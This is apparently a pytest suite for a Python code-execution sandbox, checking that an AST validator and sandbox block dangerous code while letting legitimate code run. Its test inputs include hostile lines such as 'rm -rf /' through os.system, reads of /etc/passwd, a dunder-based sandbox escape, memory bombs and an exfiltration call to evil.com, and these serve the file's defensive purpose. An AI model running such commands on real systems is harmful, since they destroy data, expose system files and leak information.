"""
Test Suite for Secure Code Execution Sandbox
Tests the secure code execution system to ensure it properly blocks malicious code
"""
import pytest
import asyncio
import tempfile
import os
from datetime import datetime

from src.cryptotrading.core.agents.secure_code_sandbox import (
    SecureCodeExecutor,
    CodeSandbox,
    SecurityLevel,
    ExecutionResult,
    ExecutionLimits,
    SecureASTValidator
)


class TestSecureASTValidator:
    """Test the AST validator for security violations"""
    
    @pytest.fixture
    def strict_validator(self):
        """Create strict security validator"""
        return SecureASTValidator(SecurityLevel.STRICT)
    
    @pytest.fixture  
    def normal_validator(self):
        """Create normal security validator"""
        return SecureASTValidator(SecurityLevel.NORMAL)
    
    def test_safe_code_validation(self, strict_validator):
        """Test that safe code passes validation"""
        safe_codes = [
            "x = 1 + 2",
            "result = sum([1, 2, 3, 4, 5])",
            "numbers = [i for i in range(10) if i % 2 == 0]",
            "def add(a, b): return a + b",
            "if x > 0: print('positive')",
            "for i in range(5): x += i"
        ]
        
        for code in safe_codes:
            violations = strict_validator.validate(code)
            assert len(violations) == 0, f"Safe code flagged as unsafe: {code}"
    
    def test_dangerous_imports_blocked(self, strict_validator):
        """Test that dangerous imports are blocked"""
        dangerous_imports = [
            "import os",
            "from subprocess import call",
            "import sys",
            "__import__('os')",
            "from os import system"
        ]
        
        for code in dangerous_imports:
            violations = strict_validator.validate(code)
            assert len(violations) > 0, f"Dangerous import not blocked: {code}"
    
    def test_dangerous_functions_blocked(self, strict_validator):
        """Test that dangerous function calls are blocked"""
        dangerous_calls = [
            "eval('1+1')",
            "exec('print(1)')",
            "__import__('os')",
            "open('/etc/passwd')",
            "compile('1+1', '', 'eval')",
            "vars()",
            "globals()",
            "locals()",
            "getattr(obj, 'attr')",
            "exit()"
        ]
        
        for code in dangerous_calls:
            violations = strict_validator.validate(code)
            assert len(violations) > 0, f"Dangerous function call not blocked: {code}"
    
    def test_dunder_attribute_access_blocked(self, strict_validator):
        """Test that dunder attribute access is blocked"""
        dunder_access = [
            "x.__class__",
            "obj.__dict__",
            "''.__class__.__mro__[1].__subclasses__()",
            "x.__init__",
            "x.__globals__"
        ]
        
        for code in dunder_access:
            violations = strict_validator.validate(code)
            assert len(violations) > 0, f"Dunder access not blocked: {code}"
    
    def test_syntax_error_detection(self, strict_validator):
        """Test that syntax errors are detected"""
        syntax_errors = [
            "if x:",  # Missing body
            "def func(",  # Incomplete function
            "print('unclosed string",
            "x = 1 +",  # Incomplete expression
        ]
        
        for code in syntax_errors:
            violations = strict_validator.validate(code)
            assert len(violations) > 0, f"Syntax error not detected: {code}"
            assert any("Syntax error" in v for v in violations)


class TestCodeSandbox:
    """Test the code execution sandbox"""
    
    @pytest.fixture
    def strict_sandbox(self):
        """Create strict security sandbox"""
        limits = ExecutionLimits(
            max_execution_time=5.0,
            max_memory_mb=32,
            max_output_size=1024
        )
        return CodeSandbox(limits, SecurityLevel.STRICT)
    
    @pytest.mark.asyncio
    async def test_safe_code_execution(self, strict_sandbox):
        """Test execution of safe code"""
        safe_code = """
x = 1 + 2
y = x * 3
result = y
"""
        
        result = await strict_sandbox.execute_code(safe_code)
        
        assert result.result == ExecutionResult.SUCCESS
        assert result.error == ""
        assert len(result.security_violations) == 0
        assert result.execution_time > 0
    
    @pytest.mark.asyncio
    async def test_dangerous_code_blocked(self, strict_sandbox):
        """Test that dangerous code is blocked"""
        dangerous_codes = [
            "import os; os.system('ls')",
            "eval('__import__(\"os\").system(\"ls\")')",
            "exec('print(__import__(\"os\").getcwd())')",
            "__import__('subprocess').call(['ls'])",
            "open('/etc/passwd').read()",
        ]
        
        for code in dangerous_codes:
            result = await strict_sandbox.execute_code(code)
            assert result.result == ExecutionResult.SECURITY_VIOLATION
            assert len(result.security_violations) > 0
    
    @pytest.mark.asyncio
    async def test_timeout_enforcement(self, strict_sandbox):
        """Test that execution timeout is enforced"""
        # Code that runs indefinitely
        infinite_code = """
while True:
    x = 1 + 1
"""
        
        result = await strict_sandbox.execute_code(infinite_code)
        assert result.result == ExecutionResult.TIMEOUT
        assert "timed out" in result.error.lower()
    
    @pytest.mark.asyncio
    async def test_memory_limit_enforcement(self, strict_sandbox):
        """Test memory limit enforcement"""
        # Code that tries to allocate large amounts of memory
        memory_bomb = """
data = []
for i in range(1000000):
    data.append([0] * 1000)
"""
        
        result = await strict_sandbox.execute_code(memory_bomb)
        # Should either timeout or hit memory error
        assert result.result in [ExecutionResult.TIMEOUT, ExecutionResult.MEMORY_ERROR, ExecutionResult.RUNTIME_ERROR]
    
    @pytest.mark.asyncio
    async def test_safe_context_provided(self, strict_sandbox):
        """Test that safe context is properly provided"""
        code_with_context = """
result = context_var + 10
"""
        
        context = {"context_var": 5}
        result = await strict_sandbox.execute_code(code_with_context, context)
        
        assert result.result == ExecutionResult.SUCCESS
        assert result.error == ""
    
    @pytest.mark.asyncio
    async def test_unsafe_context_sanitized(self, strict_sandbox):
        """Test that unsafe context variables are sanitized"""
        unsafe_context = {
            "__dangerous__": "value",  # Should be filtered
            "_private": "value",       # Should be filtered
            "safe_var": "value",       # Should be kept
            "func": "lambda_function",  # Should be filtered
        }
        
        code = """
try:
    result = safe_var  # Should work
except NameError:
    result = "safe_var_missing"

try:
    bad = __dangerous__  # Should fail
    result = "unsafe_access_allowed"
except NameError:
    pass  # Expected
"""
        
        result = await strict_sandbox.execute_code(code, unsafe_context)
        assert result.result == ExecutionResult.SUCCESS
        # The unsafe variables should not be accessible


class TestSecureCodeExecutor:
    """Test the high-level secure code executor"""
    
    @pytest.fixture
    def executor(self):
        """Create secure code executor"""
        return SecureCodeExecutor(SecurityLevel.STRICT)
    
    @pytest.mark.asyncio
    async def test_safe_execution_flow(self, executor):
        """Test normal safe execution flow"""
        safe_code = """
numbers = [1, 2, 3, 4, 5]
result = sum(numbers)
"""
        
        result = await executor.execute_safe_code(
            code=safe_code,
            tool_name="test_tool"
        )
        
        assert result['success'] is True
        assert result['result'] == 'success'
        assert len(result['security_violations']) == 0
        assert result['execution_time'] > 0
    
    @pytest.mark.asyncio
    async def test_security_violation_logging(self, executor):
        """Test that security violations are properly logged"""
        malicious_code = "import os; os.system('rm -rf /')"
        
        result = await executor.execute_safe_code(
            code=malicious_code,
            tool_name="malicious_tool"
        )
        
        assert result['success'] is False
        assert result['result'] == 'security_violation'
        assert len(result['security_violations']) > 0
        
        # Check that violation was logged
        status = executor.get_security_status()
        assert status['total_violations'] > 0
        assert status['violation_rate'] > 0
    
    @pytest.mark.asyncio
    async def test_execution_history_tracking(self, executor):
        """Test that execution history is properly tracked"""
        initial_status = executor.get_security_status()
        initial_executions = initial_status['total_executions']
        
        # Execute safe code
        await executor.execute_safe_code("x = 1", "test_tool_1")
        
        # Execute unsafe code
        await executor.execute_safe_code("import os", "test_tool_2")
        
        final_status = executor.get_security_status()
        
        assert final_status['total_executions'] == initial_executions + 2
        assert final_status['total_violations'] >= 1  # At least one from unsafe code
    
    @pytest.mark.asyncio
    async def test_different_security_levels(self, executor):
        """Test execution with different security levels"""
        # Code that might be allowed in normal mode but not strict
        questionable_code = """
x = len([1, 2, 3])
result = x
"""
        
        # Strict mode
        strict_result = await executor.execute_safe_code(
            code=questionable_code,
            tool_name="test_strict",
            security_level=SecurityLevel.STRICT
        )
        
        # Normal mode  
        normal_result = await executor.execute_safe_code(
            code=questionable_code,
            tool_name="test_normal",
            security_level=SecurityLevel.NORMAL
        )
        
        # Normal mode should be more permissive
        assert normal_result['success'] is True
    
    def test_security_status_reporting(self, executor):
        """Test security status reporting"""
        status = executor.get_security_status()
        
        required_fields = [
            'total_executions',
            'total_violations', 
            'recent_executions_1h',
            'violation_rate',
            'default_security_level'
        ]
        
        for field in required_fields:
            assert field in status, f"Missing required field: {field}"
        
        assert isinstance(status['violation_rate'], (int, float))
        assert 0 <= status['violation_rate'] <= 1


class TestSecurityIntegration:
    """Integration tests for complete security system"""
    
    @pytest.mark.asyncio
    async def test_realistic_attack_scenarios(self):
        """Test realistic attack scenarios"""
        executor = SecureCodeExecutor(SecurityLevel.STRICT)
        
        # Common attack patterns
        attack_scenarios = [
            # Directory traversal
            """
import os
files = os.listdir('../../../')
""",
            
            # Command injection
            """
import subprocess
subprocess.call(['ls', '-la'])
""",
            
            # Code injection via eval
            """
user_input = "__import__('os').system('whoami')"
eval(user_input)
""",
            
            # Memory exhaustion
            """
x = []
while True:
    x.append([0] * 10000)
""",
            
            # File system access
            """
with open('/etc/passwd', 'r') as f:
    data = f.read()
""",
            
            # Network access attempt
            """
import urllib.request
urllib.request.urlopen('http://evil.com/exfiltrate')
""",
        ]
        
        for i, attack_code in enumerate(attack_scenarios):
            result = await executor.execute_safe_code(
                code=attack_code,
                tool_name=f"attack_scenario_{i}"
            )
            
            # All attacks should be blocked
            assert result['success'] is False, f"Attack scenario {i} was not blocked"
            assert len(result['security_violations']) > 0, f"Attack scenario {i} had no violations recorded"
    
    @pytest.mark.asyncio
    async def test_legitimate_use_cases(self):
        """Test that legitimate use cases still work"""
        executor = SecureCodeExecutor(SecurityLevel.NORMAL)  # Slightly more permissive
        
        legitimate_scenarios = [
            # Data processing
            """
data = [1, 2, 3, 4, 5]
result = [x * 2 for x in data if x % 2 == 0]
""",
            
            # Simple calculations
            """
import math
result = math.sqrt(16) + math.pi
""",
            
            # String manipulation
            """
text = "Hello World"
result = text.lower().replace("world", "universe")
""",
            
            # Basic control flow
            """
total = 0
for i in range(10):
    if i % 2 == 0:
        total += i
result = total
""",
        ]
        
        for i, legitimate_code in enumerate(legitimate_scenarios):
            result = await executor.execute_safe_code(
                code=legitimate_code,
                tool_name=f"legitimate_scenario_{i}",
                security_level=SecurityLevel.NORMAL
            )
            
            # All legitimate use cases should succeed
            assert result['success'] is True, f"Legitimate scenario {i} was incorrectly blocked: {result.get('error')}"
            assert len(result['security_violations']) == 0, f"Legitimate scenario {i} had false positive violations"
    
    @pytest.mark.asyncio
    async def test_resource_limit_effectiveness(self):
        """Test that resource limits are effective"""
        limits = ExecutionLimits(
            max_execution_time=1.0,  # Very short timeout
            max_memory_mb=16,        # Very low memory limit
            max_output_size=100      # Small output limit
        )
        
        sandbox = CodeSandbox(limits, SecurityLevel.NORMAL)
        
        # Test timeout
        timeout_code = """
import time
time.sleep(5)  # Should timeout before this completes
"""
        result = await sandbox.execute_code(timeout_code)
        assert result.result == ExecutionResult.TIMEOUT
        
        # Test memory limit (if system supports it)
        memory_code = """
data = [0] * (1024 * 1024)  # Try to allocate ~1MB
"""
        result = await sandbox.execute_code(memory_code)
        # Should either timeout or hit memory limit
        assert result.result in [ExecutionResult.TIMEOUT, ExecutionResult.MEMORY_ERROR, ExecutionResult.RUNTIME_ERROR]


if __name__ == "__main__":
    # Run the tests
    pytest.main([__file__, "-v", "--tb=short"])